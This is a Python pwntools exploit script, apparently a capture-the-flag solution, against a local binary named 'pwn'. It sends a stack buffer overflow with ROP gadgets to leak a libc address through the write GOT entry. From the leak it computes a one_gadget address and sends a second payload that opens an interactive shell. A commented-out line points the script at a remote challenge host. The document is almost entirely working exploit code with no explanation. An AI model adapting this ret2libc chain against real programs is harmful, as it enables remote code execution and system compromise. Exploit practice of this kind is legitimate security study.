#!/usr/bin/python3
from pwn import *
import struct
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
elf = context.binary = ELF("./pwn", checksec=False)
libc = ELF('./glibc/libc.so.6')
padding = b"\x90"*72 # To Offset
pop_rdi = 0x400743#ROPgadget --binary pwn | grep "pop rdi"
pop_rsi = 0x400741
p = elf.debug(gdbscript="source /home/nick/global/halfdisp.py"
+"\nbreak *main+149"
+"\nc")


elf_data_addr = 0x601000 #vmmap. Grab Read Write
vmmaplibc = 0x7f49f8600000

ELF_LOADED = ELF('./pwn')
ROP_LOADED = ROP(ELF_LOADED)
MAIN_PLT = ELF_LOADED.symbols['main']
WRITE_PLT = p64(elf.plt.write)
WRITE_GOT = p64(elf.got.write)


#p = e.process()
#p = remote("94.237.53.3",45701)
#rop = pwn.ROP(elf)


#payload = pwn.flat([
#    padding,
#    pwn.p64(addr)
#    ])
payload = padding + p64(pop_rsi)+ WRITE_GOT+ b"\x90"*8+ WRITE_PLT + p64(0x40064a)

p.readuntil(b'current status: ')
p.sendline(payload)

p.read(0x15)
leaked_address = u64(p.read(8))
one_gadget = leaked_address-0xd00f0+0x4f2a5
payload2 = padding + p64(one_gadget)
p.sendline(payload2)
p.interactive()